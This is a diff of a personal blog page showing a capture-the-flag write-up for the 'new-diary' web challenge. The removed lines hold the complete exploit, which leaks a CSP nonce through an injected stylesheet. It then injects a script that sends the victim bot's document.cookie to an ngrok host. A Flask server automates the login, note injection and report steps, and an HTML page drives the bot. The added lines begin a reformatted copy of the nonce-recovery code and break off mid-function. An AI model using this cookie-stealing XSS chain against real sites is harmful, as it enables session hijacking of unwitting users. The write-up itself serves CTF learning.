-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">asdasd</span> <span class="na">srcdoc</span><span class="o">=</span><span class="s">&#39;&lt;script nonce=&#34;{nonce}&#34;&gt;fetch(&#34;{ngrok_url}/flag?flag=&#34;+encodeURI(document.cookie))&lt;/script&gt;&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
-</span></span></code></pre></div>
-<h3 id="final-exploit">
-  <a class="full-clickable-heading" href="#final-exploit">
-    Final exploit
-  </a>
-</h3>
-<p>Just go to <code>/exploit</code> and everything will be automatically done. Obviously, you need to open a ngrok http tunnel to a port, and open the python server to the same port. Furthermore, the leak.css file should have the ngrok url as well.</p>
-<p><code>server.py</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
-</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">make_response</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://new-diary.ctf.0ops.sjtu.cn&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># little random</span>
-</span></span><span class="line"><span class="cl"><span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;pwn&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000000</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">ngrok_url</span> <span class="o">=</span> <span class="s1">&#39;https://679d-131-175-28-197.ngrok-free.app/&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">nonce_substr</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">retrieveNonce</span><span class="p">(</span><span class="n">nonce_substr</span><span class="o">=</span><span class="n">nonce_substr</span><span class="p">,</span> <span class="n">force</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># find the beginning of the nonce (there is no match for start)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">new_substr</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">nonce_substr</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">30</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">force</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;different length of new_substr [</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)</span><span class="si">}</span><span class="s2">] - aborting&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="n">backup</span> <span class="o">=</span> <span class="p">[]</span>
-</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">remove_i</span> <span class="o">=</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">start_i</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">        <span class="n">left</span> <span class="o">=</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)):</span>
-</span></span><span class="line"><span class="cl">            <span class="n">end_j</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span> <span class="o">!=</span> <span class="n">j</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">start_i</span> <span class="o">==</span> <span class="n">end_j</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">left</span> <span class="o">=</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">left</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="c1"># beginning</span>
-</span></span><span class="line"><span class="cl">            <span class="n">remove_i</span> <span class="o">=</span> <span class="n">i</span>
-</span></span><span class="line"><span class="cl">            <span class="n">nonce</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">break</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no beginning - aborting&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">new_substr</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">remove_i</span><span class="p">]</span> <span class="o">+</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">remove_i</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># print(&#34;new substr: &#34; + str(new_substr))</span>
-</span></span><span class="line"><span class="cl">        <span class="n">found</span> <span class="o">=</span> <span class="p">[]</span>
-</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">new_substr</span><span class="p">)):</span>
-</span></span><span class="line"><span class="cl">            <span class="n">start_i</span> <span class="o">=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">nonce</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span> <span class="o">==</span> <span class="n">start_i</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                <span class="c1"># print(&#34;found: &#34; + start_i)</span>
-</span></span><span class="line"><span class="cl">                <span class="n">found</span> <span class="o">+=</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">            <span class="c1"># start over from latest backup</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">backup</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                <span class="n">nonce</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">                <span class="n">found</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">                <span class="n">new_substr</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">                <span class="n">backup</span> <span class="o">=</span> <span class="n">backup</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no backup - aborting&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="k">break</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;found more than one: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">found</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">                <span class="n">backup</span> <span class="o">+=</span> <span class="p">[[</span><span class="n">nonce</span><span class="p">,</span> <span class="n">found</span><span class="p">[</span><span class="mi">1</span><span class="p">:],</span> <span class="n">new_substr</span><span class="p">]]</span>
-</span></span><span class="line"><span class="cl">            <span class="n">remove_i</span> <span class="o">=</span> <span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">            <span class="n">nonce</span> <span class="o">+=</span> <span class="n">new_substr</span><span class="p">[</span><span class="n">remove_i</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1"># input(&#34;nonce: &#34; + nonce)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">nonce</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">user</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;login failed&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_zero_note</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/write&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;title&#39;</span><span class="p">:</span><span class="s1">&#39;meta&#39;</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;&lt;meta http-equiv=&#34;refresh&#34; content=&#34;0.0;url=</span><span class="si">{</span><span class="n">ngrok_url</span><span class="si">}</span><span class="s1">&#34;&gt;&#39;</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">    <span class="n">share</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_first_note</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/write&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;title&#39;</span><span class="p">:</span><span class="s1">&#39;linkstylesheet&#39;</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;link rel=&#34;stylesheet&#34; href=&#34;https://unpkg.com/alemmi@x.x.x/leak.css&#34;&gt;&lt;input /&gt;&#39;</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">    <span class="n">share</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">share</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/share_diary/</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_script_nonce</span><span class="p">(</span><span class="n">nonce</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">script</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;&lt;iframe name=asd srcdoc=&#34;&lt;script nonce=</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&gt;top.location=&#39;</span><span class="si">{</span><span class="n">ngrok_url</span><span class="si">}</span><span class="s2">flag?flag=&#39;+encodeURI(document[&#39;cookie&#39;])&lt;/script&gt;&#34;/&gt;&#34;&#34;&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/write&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;title&#39;</span><span class="p">:</span><span class="s1">&#39;pwning&#39;</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="n">script</span><span class="p">})</span>
-</span></span><span class="line"><span class="cl">    <span class="n">share</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/report?id=0&amp;username=&#39;</span> <span class="o">+</span> <span class="n">user</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/logout&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/exploit&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">test</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">user</span>
-</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="s1">&#39;pwn&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1000000</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">logout</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">login</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">write_zero_note</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">write_first_note</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">test</span> <span class="o">==</span> <span class="kc">False</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;reporting...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">report</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;exploit for &#34;</span><span class="o">+</span><span class="n">user</span><span class="o">+</span><span class="s2">&#34; done&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">flag</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag: &#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;You have been pwned&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Pls give me flag&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">x</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;x: &#34;</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;current nonce_substr: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">nonce_substr</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">        <span class="n">nonce_substr</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">nonce_substr</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">30</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">nonce</span> <span class="o">=</span> <span class="n">retrieveNonce</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;nonce: &#34;</span> <span class="o">+</span> <span class="n">nonce</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="n">create_script_nonce</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">USERNAME</span><span class="o">=</span><span class="n">user</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Public URL:&#39;</span><span class="p">,</span> <span class="n">ngrok_url</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;aborting&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span></span></code></pre></div><p><code>index.html</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">milliseconds</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">milliseconds</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">        <span class="kr">async</span> <span class="kd">function</span> <span class="nx">run</span><span class="p">(){</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">bot_window</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;http://localhost/share/read#id=1&amp;username={{USERNAME}}&#34;</span><span class="p">);</span> <span class="c1">// Exploit 1, leak nonce
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">7000</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="nx">bot_window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;http://localhost/share/read#id=2&amp;username={{USERNAME}}&#34;</span><span class="p">;</span> <span class="c1">// Exploit 2, leak cookie
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;O&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">run</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>At the end, it was a fun challenge to solve ❤️ Thanks to the authors for the challenge and for the CTF in general.</p></div>
-    </article>
-  </main>
-
-      </div>
-      <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      <br />
-      
-        
-        <a href="https://github.com/salvatore-abello">Github</a>
-      
-         | 
-        <a href="https://www.linkedin.com/in/salvatore-abello-411b64252/">Linkedin</a>
-      
-         | 
-        <a href="https://x.com/salvatoreabello">X</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright 2025. All rights reserved.
-    <hr />
-    <code>Made with ❤️ by <strong>Salvatore Abello</strong></code>.
-  </p>
-</footer>
-
-    </div>
-  </body>
-</html>
+It&rsquo;s possible to recover the nonce in many ways, the one we used is the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=k>def</span> <span class=nf>retrieveNonce</span><span class=p>(</span><span class=n>nonce_substr</span><span class=o>=</span><span class=n>nonce_substr</span><span class=p>,</span> <span class=n>force</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=c1># find the beginning of the nonce (there is no match for start)</span>
+</span></span><span class=line><span class=cl>    <span class=n>new_substr</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>nonce_substr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>30</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>force</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;different length of new_substr [</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>new_substr</span><span class=p>)</span><span class=si>}</span><span class=s2>] - aborting&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>    <span class=n>backup</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=n>nonce</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>remove_i</span> <span class=o>=</span> <span class=mi>0</span>
